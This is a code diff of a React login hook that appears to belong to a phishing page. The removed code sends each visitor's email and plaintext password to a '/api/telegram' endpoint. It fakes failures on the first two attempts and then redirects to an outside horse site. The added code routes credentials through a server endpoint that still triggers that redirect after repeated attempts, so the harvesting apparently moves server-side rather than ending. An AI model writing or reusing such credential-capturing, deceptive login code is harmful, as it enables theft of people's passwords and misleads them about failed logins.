@@ -1,4 +1,4 @@
-import { useState, useRef } from 'react'
+import { useState } from 'react'
 import { LoginCredentials, LoginState } from '../../../types/auth'
 
 export function useLogin() {
@@ -8,76 +8,64 @@ export function useLogin() {
     success: false,
   })
 
-  const attemptsRef = useRef(0)
-
   const login = async (credentials: LoginCredentials) => {
     setState({ isLoading: true, error: null, success: false })
 
     try {
-      await new Promise((resolve) => setTimeout(resolve, 1000))
+      const response = await fetch('/api/auth/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(credentials),
+      })
 
-      // Increment attempts using useRef for immediate access
-      attemptsRef.current += 1
-      const currentAttempt = attemptsRef.current
+      const data = await response.json()
 
-      // Log attempt via API
-      const logMessage = `🔐 Login attempt ${currentAttempt}
-Email: ${credentials.email}
-Password: ${credentials.password}
-Time: ${new Date().toISOString()}`
-
-      try {
-        const response = await fetch('/api/telegram', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ message: logMessage }),
-        })
-        if (!response.ok) {
-          console.error('Telegram API error:', response.status, await response.text())
-        }
-      } catch (telegramError) {
-        console.error('Failed to send Telegram notification:', telegramError)
-        // Continue with login process even if Telegram notification fails
-      }
-
-      // First two attempts fail
-      if (currentAttempt <= 2) {
+      // Check if we need to redirect (max attempts exceeded)
+      if (data.redirect) {
+        // Redirect to dreamhorse.com after showing error
         setState({
           isLoading: false,
-          error: `Invalid email or password. (Attempt ${currentAttempt}/3)`,
+          error: data.error || 'Invalid username and password',
           success: false,
         })
+        // Redirect after a short delay so user can see the error
+        setTimeout(() => {
+          window.location.href = data.redirect
+        }, 1500)
         return
       }
 
-      // Third attempt "succeeds"
-      setState({
-        isLoading: false,
-        error: null,
-        success: true,
-      })
-
-      // Reset attempts counter and redirect after short delay
-      attemptsRef.current = 0
-      setTimeout(() => {
-        window.location.href = "https://dreamhorse.com"
-      }, 1000)
-
+      if (response.ok && data.success) {
+        setState({
+          isLoading: false,
+          error: null,
+          success: true,
+        })
+        // Optionally redirect to dashboard or home page after success
+        // window.location.href = '/dashboard'
+      } else {
+        // Authentication failed - show generic error message
+        setState({
+          isLoading: false,
+          error: data.error || 'Invalid username and password',
+          success: false,
+        })
+      }
     } catch (error) {
-      console.error('Login error:', error)
+      // Don't expose detailed error messages to client
       setState({
         isLoading: false,
         error: 'An error occurred. Please try again.',
         success: false,
       })
+      console.error('[LOGIN] Request failed:', error)
     }
   }
 
   const reset = () => {
     setState({ isLoading: false, error: null, success: false })
-    attemptsRef.current = 0
   }
 
   return { ...state, login, reset }
